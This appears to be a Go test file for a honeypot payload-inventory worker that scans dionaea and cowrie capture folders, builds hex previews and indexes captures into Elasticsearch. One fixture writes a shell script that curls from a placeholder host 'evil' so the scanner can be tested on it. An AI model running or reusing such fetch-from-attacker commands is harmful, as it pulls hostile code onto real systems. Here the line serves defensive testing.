package main

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
)

func writeHashNamedFile(t *testing.T, dir, hash string, content []byte) string {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, hash)
	if err := os.WriteFile(path, content, 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestScanDirsClassifiesAndSourcesAFile(t *testing.T) {
	dir := t.TempDir()
	hash := "0123456789abcdef0123456789abcdef01234567"
	writeHashNamedFile(t, dir, hash, []byte("#!/bin/sh\ncurl http://evil/x\n"))

	files, paths := scanDirs([]string{dir})
	if len(files) != 1 {
		t.Fatalf("expected 1 file, got %d: %+v", len(files), files)
	}
	f := files[0]
	if f.Hash != hash {
		t.Fatalf("hash = %q, want %q", f.Hash, hash)
	}
	if f.KindCode != "shell" {
		t.Fatalf("KindCode = %q, want shell", f.KindCode)
	}
	if f.Copies != 1 {
		t.Fatalf("Copies = %d, want 1", f.Copies)
	}
	if len(f.Sources) != 1 {
		t.Fatalf("Sources = %+v, want exactly one", f.Sources)
	}
	if paths[hash] == "" {
		t.Fatal("expected a resolved path for the scanned hash")
	}
}

// TestScanDirsCarriesMtimeUTC covers #512 for this worker's own copy of the
// scan (ported from dashboard/payloads_data.go's original scanPayloads,
// removed there by #1223): every timestamp field needs a UTC twin for
// hp-app.js's timezone/clock-format conversion, not just a server-formatted
// display string.
func TestScanDirsCarriesMtimeUTC(t *testing.T) {
	dir := t.TempDir()
	hash := "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	writeHashNamedFile(t, dir, hash, []byte("sample"))

	files, _ := scanDirs([]string{dir})
	if len(files) != 1 {
		t.Fatalf("expected 1 file, got %d", len(files))
	}
	if files[0].MtimeUTC == "" {
		t.Fatal("captured file MtimeUTC must be populated")
	}
}

// TestScanDirsCarriesSizeCappedPreview covers #59 for this worker's own
// copy of the scan: a hex-dump preview of the file head, capped at
// payloadPreviewCap so an oversized capture never grows the preview or the
// row it backs.
func TestScanDirsCarriesSizeCappedPreview(t *testing.T) {
	dir := t.TempDir()
	hash := "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
	big := bytes.Repeat([]byte{'A'}, payloadPreviewCap*4)
	writeHashNamedFile(t, dir, hash, big)

	files, _ := scanDirs([]string{dir})
	if len(files) != 1 {
		t.Fatalf("expected 1 file, got %d", len(files))
	}
	f := files[0]
	if !f.PreviewTruncated {
		t.Fatal("a file larger than payloadPreviewCap must be marked truncated")
	}
	wantDump := hex.Dump(big[:payloadPreviewCap])
	if f.Preview != wantDump {
		t.Fatalf("preview was not capped at payloadPreviewCap bytes: got %d dump chars, want %d", len(f.Preview), len(wantDump))
	}
}

func TestScanDirsIgnoresNonHashNamedFiles(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "not-a-hash.txt"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	files, _ := scanDirs([]string{dir})
	if len(files) != 0 {
		t.Fatalf("expected no files, got %+v", files)
	}
}

func TestScanDirsMergesSameHashAcrossDirectoriesAsCopiesAndSources(t *testing.T) {
	hash := "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	dionaeaDir := t.TempDir()
	dionaeaDir = filepath.Join(dionaeaDir, "dionaea-lib", "binaries")
	writeHashNamedFile(t, dionaeaDir, hash, []byte("MZ"))

	cowrieDir := t.TempDir()
	cowrieDir = filepath.Join(cowrieDir, "cowrie-downloads")
	writeHashNamedFile(t, cowrieDir, hash, []byte("MZ"))

	files, _ := scanDirs([]string{dionaeaDir, cowrieDir})
	if len(files) != 1 {
		t.Fatalf("expected 1 merged file, got %d: %+v", len(files), files)
	}
	f := files[0]
	if f.Copies != 2 {
		t.Fatalf("Copies = %d, want 2", f.Copies)
	}
	if len(f.Sources) != 2 || f.Sources[0] != "cowrie" || f.Sources[1] != "dionaea" {
		t.Fatalf("Sources = %+v, want [cowrie dionaea]", f.Sources)
	}
}

func TestPayloadSourceNameClassifiesKnownDirs(t *testing.T) {
	cases := map[string]string{
		"/dionaea-lib/binaries":  "dionaea",
		"/cowrie-downloads":      "cowrie",
		"/state/script-payloads": "scripts",
		"/some/other/dir":        "dir",
	}
	for dir, want := range cases {
		if got := payloadSourceName(dir); got != want {
			t.Errorf("payloadSourceName(%q) = %q, want %q", dir, got, want)
		}
	}
}

func TestHumanBytes(t *testing.T) {
	cases := map[int64]string{
		500:             "500 B",
		2048:            "2.0 KB",
		5 * 1024 * 1024: "5.0 MB",
	}
	for n, want := range cases {
		if got := humanBytes(n); got != want {
			t.Errorf("humanBytes(%d) = %q, want %q", n, got, want)
		}
	}
}

func TestIndexPayloadInventorySkipsUnchangedAndWritesNew(t *testing.T) {
	var puts int
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-inventory-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			w.WriteHeader(http.StatusNotFound)
		case http.MethodPut:
			puts++
			w.WriteHeader(http.StatusCreated)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	indexPayloadInventory(es, []capturedFile{{Hash: "deadbeef"}})
	if puts != 1 {
		t.Fatalf("expected 1 PUT for a new document, got %d", puts)
	}
}

func TestIndexPayloadInventoryPreservesExtraFieldsOnOverwrite(t *testing.T) {
	var putBody []byte
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-inventory-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			// A doc dashboard already enriched with a field capturedFile
			// (this worker's struct) has no idea about -- must survive.
			w.Write([]byte(`{"_seq_no":1,"_primary_term":1,"_source":{"Hash":"deadbeef","Size":1,"GitHubAnalysisURL":"/github-analysis/deadbeef"}}`))
		case http.MethodPut:
			putBody, _ = io.ReadAll(r.Body)
			w.WriteHeader(http.StatusOK)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	// Size differs (1 -> 2) so this isn't the "unchanged, skip" path.
	indexPayloadInventory(es, []capturedFile{{Hash: "deadbeef", Size: 2}})

	var got map[string]any
	if err := json.Unmarshal(putBody, &got); err != nil {
		t.Fatalf("PUT body not valid JSON: %v (%s)", err, putBody)
	}
	if got["GitHubAnalysisURL"] != "/github-analysis/deadbeef" {
		t.Fatalf("GitHubAnalysisURL was dropped on overwrite: %+v", got)
	}
	if got["Size"] != float64(2) {
		t.Fatalf("Size wasn't updated to the fresh scan's value: %+v", got)
	}
}

func TestIndexPayloadInventorySkipsRewriteWhenOnlyExtraFieldsDiffer(t *testing.T) {
	// Regression: comparing this worker's fresh struct-JSON byte-for-byte
	// against a stored document that carries extra dashboard-only fields
	// (or was itself written by a prior merge, so its key order differs
	// from a plain struct marshal) must not look "changed" on every single
	// scan cycle forever. The stored doc below is exactly what a previous
	// call to indexPayloadInventory with this same capturedFile would have
	// written, plus one field this worker never sets.
	file := capturedFile{Hash: "deadbeef", Size: 2, SizeH: "2 B", Kind: "Plain-text artifact", KindCode: "text"}
	storedFields, err := json.Marshal(file)
	if err != nil {
		t.Fatal(err)
	}
	var storedMap map[string]json.RawMessage
	if err := json.Unmarshal(storedFields, &storedMap); err != nil {
		t.Fatal(err)
	}
	storedMap["GitHubAnalysisURL"] = json.RawMessage(`"/github-analysis/deadbeef"`)
	stored, err := json.Marshal(storedMap)
	if err != nil {
		t.Fatal(err)
	}

	var puts int
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-inventory-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			w.Write([]byte(`{"_seq_no":1,"_primary_term":1,"_source":` + string(stored) + `}`))
		case http.MethodPut:
			puts++
			w.WriteHeader(http.StatusOK)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	indexPayloadInventory(es, []capturedFile{file})
	if puts != 0 {
		t.Fatalf("expected no PUT when this worker's own fields are unchanged, got %d", puts)
	}
}

func TestMirrorPayloadBytesMarksOversizeAsTooLarge(t *testing.T) {
	var indexed storedPayloadBytes
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-bytes-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodHead:
			w.WriteHeader(http.StatusNotFound)
		case http.MethodPut:
			decodeJSONBody(t, r, &indexed)
			w.WriteHeader(http.StatusCreated)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	mirrorPayloadBytes(es, "deadbeef", "/does/not/matter", payloadBytesRawCap+1)
	if !indexed.TooLarge || indexed.DataBase64 != "" {
		t.Fatalf("expected a too-large marker with no data, got %+v", indexed)
	}
}

func TestMirrorPayloadBytesEncodesSmallFile(t *testing.T) {
	dir := t.TempDir()
	path := writeHashNamedFile(t, dir, "deadbeef", []byte("hello payload"))

	var indexed storedPayloadBytes
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-bytes-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodHead:
			w.WriteHeader(http.StatusNotFound)
		case http.MethodPut:
			decodeJSONBody(t, r, &indexed)
			w.WriteHeader(http.StatusCreated)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	mirrorPayloadBytes(es, "deadbeef", path, 13)
	if indexed.TooLarge {
		t.Fatal("small file should not be marked too-large")
	}
	if indexed.DataBase64 == "" {
		t.Fatal("expected base64 data to be set")
	}
}

func TestMirrorPayloadBytesSkipsAlreadyIndexed(t *testing.T) {
	var puts int
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-bytes-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodHead:
			w.WriteHeader(http.StatusOK) // exists -- no body, matching a real ES HEAD response
		case http.MethodGet:
			t.Fatal("mirrorPayloadBytes must use a HEAD existence check (#1221), not a full docGet")
		case http.MethodPut:
			puts++
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	mirrorPayloadBytes(es, "deadbeef", "/does/not/matter", 10)
	if puts != 0 {
		t.Fatalf("expected no PUT when already indexed, got %d", puts)
	}
}
